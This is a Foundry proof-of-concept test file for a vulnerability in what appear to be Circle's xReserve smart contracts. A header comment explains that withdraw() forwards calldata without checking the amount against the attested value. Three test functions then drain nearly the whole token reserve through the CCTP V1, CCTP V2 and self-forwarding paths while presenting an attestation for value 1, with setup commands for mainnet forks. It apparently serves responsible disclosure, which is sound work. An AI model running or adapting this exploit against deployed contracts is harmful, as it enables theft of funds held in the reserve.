// SPDX-License-Identifier: Apache-2.0
//
// PoC for circlefin/evm-xreserve-contracts.
//
// xReserve.withdraw() forwards user-supplied calldata via Address.functionCall
// without checking that the inner amount matches the attested transferSpec.value
// (Withdrawal.sol:206-214). Combined with the type(uint256).max approval xReserve
// gives to TokenMessenger / TokenMessengerV2 / GatewayWallet (TokenSupport.sol:96-101),
// a signed attestation for value=N can forward any amount M from the reserve.
// All three forwarding paths (CCTP V1, CCTP V2, xReserve self-forwarding) share
// the same gap.
//
// To run:
//
//   git clone https://github.com/circlefin/evm-xreserve-contracts && cd evm-xreserve-contracts
//   git config --global url."https://github.com/".insteadOf git@github.com:   # if no SSH key
//   git submodule update --init --recursive
//   bash scripts/fix_submodule_compatibility.sh
//
//   # Add `import {console2} from "forge-std/Test.sol";` to test/reserve/Withdraw.t.sol
//   # Paste the three test methods below into contract XReserveWithdrawTest
//   # (members are private, so inherit-and-extend doesn't work; paste in place)
//
//   forge test --match-test test_PoC_drains -vv                       # local
//   forge test --rpc-url ethereum --match-test test_PoC_drains -vv    # mainnet fork
//
// All three pass against local mock and against Ethereum / Arbitrum / Optimism
// mainnet forks. Each drains 9,999,999 of 10,000,000 seeded units while presenting
// an attestation for value=1.
//
// The signing key in these tests is a local key set as an authorized attestation
// signer in setUp; this proves the on-chain bypass given a valid signature.
// The off-chain question (whether Circle's /v1/withdraw endpoint will sign such a
// payload) is documented in the report and is the only remaining unknown.

// CCTP V1 path (tokenMessenger).
function test_PoC_drainsReserveViaInflatedCCTPForwardingAmount() public {
    uint256 reserveSeed   = 10_000_000;        // 10 USDC
    uint256 attestedValue = 1;                 // tiny attested amount
    uint256 inflatedAmount = reserveSeed;       // forwarded amount = full reserve

    // 4th arg true also bumps totalSupply so the eventual burn() in
    // TokenMinter doesn't underflow on the mock token. Mainnet USDC's
    // totalSupply is large enough that this is irrelevant on a fork.
    deal(address(token), address(reserve), reserveSeed, true);

    Attestation memory attestation = defaultAttestation;
    attestation.spec.value = attestedValue;
    attestation.spec.destinationRecipient = GatewayAddressLib._addressToBytes32(address(reserve));

    WithdrawHookData memory hookData = withdrawHookDataToCctpV1;
    hookData.forwardingCalldata =
        ForwardingCalldataLib.encodeCCTPV1DepositForBurn(inflatedAmount, address(token));
    attestation.spec.hookData = WithdrawHookDataLib.encodeWithdrawHookData(hookData);

    bytes memory payload   = AttestationLib.encodeAttestation(attestation);
    bytes memory signature = _signAttestation(payload);

    uint256 reserveBefore = token.balanceOf(address(reserve));
    console2.log("reserve balance BEFORE :", reserveBefore);
    console2.log("attested value         :", attestedValue);
    console2.log("inflated forward amount:", inflatedAmount);

    reserve.withdraw(payload, signature);

    uint256 reserveAfter = token.balanceOf(address(reserve));
    console2.log("reserve balance AFTER  :", reserveAfter);
    console2.log("delta (drained)        :", reserveBefore - reserveAfter);

    assertGt(
        reserveBefore - reserveAfter,
        attestedValue,
        "Drain bounded by attested value -- finding may be patched"
    );
}

// CCTP V2 path (tokenMessengerV2).
function test_PoC_drainsReserveViaInflatedCCTPV2ForwardingAmount() public {
    uint256 reserveSeed   = 10_000_000;
    uint256 attestedValue = 1;
    uint256 inflatedAmount = reserveSeed;

    deal(address(token), address(reserve), reserveSeed, true);

    Attestation memory attestation = defaultAttestation;
    attestation.spec.value = attestedValue;
    attestation.spec.destinationRecipient = GatewayAddressLib._addressToBytes32(address(reserve));

    WithdrawHookData memory hookData = withdrawHookDataToCctpV2;
    hookData.forwardingCalldata =
        ForwardingCalldataLib.encodeCCTPV2DepositForBurn(inflatedAmount, address(token));
    attestation.spec.hookData = WithdrawHookDataLib.encodeWithdrawHookData(hookData);

    bytes memory payload   = AttestationLib.encodeAttestation(attestation);
    bytes memory signature = _signAttestation(payload);

    uint256 reserveBefore = token.balanceOf(address(reserve));
    reserve.withdraw(payload, signature);
    uint256 reserveAfter = token.balanceOf(address(reserve));
    console2.log("V2 delta drained:", reserveBefore - reserveAfter);

    assertGt(
        reserveBefore - reserveAfter,
        attestedValue,
        "CCTP V2 path did not drain - finding may be patched"
    );
}

// xReserve self-forwarding path (_processXReserveForwarding). Selector check exists,
// amount check does not. Drain goes via wallet.depositFor(localToken, remoteDepositor,
// INFLATED_VALUE), which pulls INFLATED_VALUE from the reserve via the unlimited
// GatewayWallet allowance and credits the remote depositor in the wallet, recoverable
// by the attacker through the standard Gateway burn-and-mint flow.
function test_PoC_drainsReserveViaInflatedSelfForwardingAmount() public {
    uint256 reserveSeed   = 10_000_000;
    uint256 attestedValue = 1;
    uint256 inflatedAmount = reserveSeed;

    deal(address(token), address(reserve), reserveSeed, true);

    Attestation memory attestation = defaultAttestation;
    attestation.spec.value = attestedValue;
    attestation.spec.destinationRecipient = GatewayAddressLib._addressToBytes32(address(reserve));

    WithdrawHookData memory hookData = withdrawHookDataToRemoteChain; // forwardingContract = address(reserve)
    hookData.forwardingCalldata =
        ForwardingCalldataLib.encodeXReserveDepositToRemote(inflatedAmount, REMOTE_DOMAIN_2, address(token));
    attestation.spec.hookData = WithdrawHookDataLib.encodeWithdrawHookData(hookData);

    bytes memory payload   = AttestationLib.encodeAttestation(attestation);
    bytes memory signature = _signAttestation(payload);

    uint256 reserveBefore = token.balanceOf(address(reserve));
    reserve.withdraw(payload, signature);
    uint256 reserveAfter = token.balanceOf(address(reserve));
    console2.log("Self-fwd delta drained:", reserveBefore - reserveAfter);

    assertGt(
        reserveBefore - reserveAfter,
        attestedValue,
        "Self-forwarding path did not drain - finding may be patched"
    );
}
